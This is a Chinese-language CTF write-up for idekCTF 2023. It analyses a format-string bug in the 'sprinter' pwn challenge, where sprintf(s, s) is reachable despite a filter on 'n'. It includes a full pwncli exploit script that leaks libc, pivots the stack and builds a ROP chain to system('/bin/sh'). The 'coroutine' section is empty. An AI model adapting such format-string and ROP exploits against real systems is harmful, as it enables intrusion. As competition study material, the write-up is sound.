---
name: idekCTF-2023
link: https://ctf.idek.team/
challenges:
- name: sprinter
  tag: fmt-string | sprintf
  solved: true
- name: coroutine
  tag: 
  solved: true
---

>   春节前后都比较忙，可恶
>
>   回头看了 pwn 题，都挺有意思的，可惜了

## sprinter

>   之前其它国内比赛做多了，很多 pwn 题都是逆向上恶心得不行漏洞点又没什么创新，idek 中倒是没有这种情况
>
>   神中神🥰

#### Analysis

比较麻烦的是 vuln 函数中有 `sprintf(s, s)` 的操作，会导致一些奇怪的行为：

```c
void __fastcall vuln()
{
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v1; // [rsp+108h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  printf("Enter your string into my buffer, located at %p: ", s);
  fgets(s, 256, stdin);
  if ( !strchr(s, 'n') && strlen(s) <= 38 )
    sprintf(s, s);
}
```

同时通过 strchr 禁用了 `%n` 的操作，也就是没法直接写入，这里思路还是有一点绕的，可以想到如下两种打法：

-   用 `\x00` 截断 `strchr` 和 `strlen` 的检查，再通过 `%c` 之类的操作覆盖掉原来的 `\x00`，通过 `%n` 定向写入完成利用
-   用 `%.7s` 去覆盖 `canary` 进而实现栈溢出 + ROP

#### Exploitation

先来看第一种打法，难点有两处：

-   计算 %(x)c 的 padding 时，其实是在计算 `x*2 - 4 == padding_length`
-   这里固定 `leak_addr&0xff==0x90`，实际上是为了两次栈迁移时都能使目标地址和原先的 rbp 仅有最低位不同
    -   实际上这里需要 `1/16` 的爆破，不过最近在尝试 pwncli，写循环爆破时总是出现奇奇怪怪的问题，故采用如下脚本运行:
```sh
while $1:                                                                                                                                             ─╯
do
./exp.py de ./pwn
done
```

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b"Enter your string into my buffer, located at 0x")
leak_addr = int(ru(b": ", drop=True), 16)
lg("leak_addr")
assert leak_addr&0xff == 0x90           #   for the convience of calculation of the fake rbp
last_rip_addr = leak_addr + 0x118
last_rbp_addr = leak_addr + 0x110
lg("last_rbp_addr")
lg("last_rip_addr")

pop_rdi_ret = 0x0000000000401373
ret_addr    = pop_rdi_ret + 1

debugB()

payload = b"%46c"
#  actually, the padding length should be 46*2-4, and the len(previous_payload)==4, so here we directly use 46*2==0x58
payload = payload.ljust(0x58, b"\x00")  #   hijack rbp to controllable address
payload += b"%29$hhn"
payload = payload.ljust(0xad, b"a")     #   set rip to gadget "leave; ret;"
payload += b"%30$hhn"
payload = payload.ljust(0xc0, b"a")
payload += p64(last_rbp_addr)
payload += p64(last_rip_addr)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(ret_addr)
payload += p64(elf.sym['main'])
sl(payload)

libc_base = u64_ex(rn(6)) - libc.sym.printf
lg("libc_base")

ru(b"Enter your string into my buffer, located at 0x")
leak_addr = int(ru(b": ", drop=True), 16)
lg("leak_addr")
last_rip_addr = leak_addr + 0x118
last_rbp_addr = leak_addr + 0x110
lg("last_rbp_addr")
lg("last_rip_addr")

#  now that we've got libc base, it's quite easy to repeat the above code
payload = b"%22c"
payload = payload.ljust(0x28, b"\x00")  #   hijack rbp to controllable address
payload += b"%29$hhn"
payload = payload.ljust(0xad, b"a")     #   set rip to gadget "leave; ret;"
payload += b"%30$hhn"
payload = payload.ljust(0xc0, b"a")
payload += p64(last_rbp_addr)
payload += p64(last_rip_addr)
payload += p64(pop_rdi_ret)
payload += p64(libc_base + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base + libc.sym.system)
sl(payload)

ia()
```

---

## coroutine


